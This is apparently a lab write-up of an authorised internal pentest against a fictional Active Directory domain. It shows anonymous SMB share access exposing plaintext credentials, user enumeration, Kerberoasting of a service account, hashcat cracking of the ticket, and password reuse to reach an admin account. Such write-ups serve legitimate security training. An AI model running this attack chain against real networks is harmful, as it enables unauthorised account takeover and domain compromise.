# OBJECTIVE

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.

## INITIAL ACCESS

The client has provided you with VPN access to their internal network, but no credentials.

### OPEN PORT

```bash
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

# SMB Enumeration

```bash
pwn:~> smbclient -L //10.0.28.104 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	notes           Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
pwn:~> smbclient //10.0.28.104/notes -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 17 17:38:39 2026
  ..                                DHS        0  Sat Jan 17 17:38:33 2026
  notes.txt                           A      129  Sat Jan 17 17:38:47 2026

		7731967 blocks of size 4096. 2435881 blocks available
smb: \> get notes.txt
getting file \notes.txt of size 129 as notes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
pwn:~> cat notes.txt 
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:*martini*
```

We got creds

## SMB Enumeration with creds

```bash
pwn:~> nxc smb 10.0.28.104 -u mprice -p '*martini*' --shares
SMB         10.0.28.104     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.28.104     445    DC01             [+] DRY.MARTINI.BARS\mprice:*martini* 
SMB         10.0.28.104     445    DC01             [*] Enumerated shares
SMB         10.0.28.104     445    DC01             Share           Permissions            Remark
SMB         10.0.28.104     445    DC01             -----           -----------            ------
SMB         10.0.28.104     445    DC01             ADMIN$                                 Remote Admin
SMB         10.0.28.104     445    DC01             C$                                     Default share
SMB         10.0.28.104     445    DC01             IPC$            READ                   Remote IPC
SMB         10.0.28.104     445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.0.28.104     445    DC01             notes           READ,WRITE             
SMB         10.0.28.104     445    DC01             SYSVOL          READ                   Logon server share 
```

Well, nothing much. Just that we have write access to notes shares using the creds

## Retrieving users from dc

```bash
pwn:~> nxc smb 10.0.28.104 -u mprice -p '*martini*' --users
SMB         10.0.28.104     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.28.104     445    DC01             [+] DRY.MARTINI.BARS\mprice:*martini* 
SMB         10.0.28.104     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.0.28.104     445    DC01             Administrator                 2026-01-12 16:00:19 0       Built-in account for administering the computer/domain 
SMB         10.0.28.104     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.0.28.104     445    DC01             krbtgt                        2026-01-17 01:19:20 0       Key Distribution Center Service Account 
SMB         10.0.28.104     445    DC01             mprice                        2026-01-17 16:40:55 0        
SMB         10.0.28.104     445    DC01             athena.t0                     2026-01-20 18:20:44 0

SMB         10.0.28.104     445    DC01             [*] Enumerated 6 local users: DRY

```

`ATHENA_SVC` seems to be a service account: Lets try to retrieve the service ticket for offline cracking(kerberoasting)

## Retrieving service ticket for `ATHENA_SVC`

```bash
pwn:~> nxc ldap 10.0.28.104 -u mprice -p '*martini*' --kerberoast ke.txt
LDAP        10.0.28.104     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.0.28.104     389    DC01             [+] DRY.MARTINI.BARS\mprice:*martini* 
LDAP        10.0.28.104     389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.0.28.104     389    DC01             [*] Total of records returned 1
LDAP        10.0.28.104     389    DC01             [*] sAMAccountName: ATHENA_SVC, memberOf: ['CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS', 'CN=Remote Desktop Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS'], pwdLastSet: 2026-01-20 19:20:32.856622, lastLogon: <never>
LDAP        10.0.28.104     389    DC01             $krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\ATHENA_SVC*$810704b3cf3ca7940134b9ec476898dd$ 
```

## Retrieving `ATHENA_SVC`  password by Cracking Service Ticket hash

```bash
pwn:~> hashcat -m 13100 ke.txt ~/Documents/wordlist/rockyou.txt 
hashcat (v7.1.2) starting

$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\ATHENA_SVC*$810704b3cf3ca7940134b9ec476898dd$:1dirtymartini

```

The password is `1dirtymartini` 

```bash
pwn:~> nxc smb 10.0.28.104 -u 'ATHENA_SVC' -p '1dirtymartini'
SMB         10.0.28.104     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.28.104     445    DC01             [+] DRY.MARTINI.BARS\ATHENA_SVC:1dirtymartini
```

Moving on from here, we can try password spraying, since we have passwords and usersnames

`athena.t0`  use same password as `ATHENA_SVC` 

```bash
pwn:~> nxc smb 10.0.28.104 -u 'athena.t0' -p '1dirtymartini'
SMB         10.0.28.104     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.28.104     445    DC01             [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

That confirm `athena.t0` is an admin account
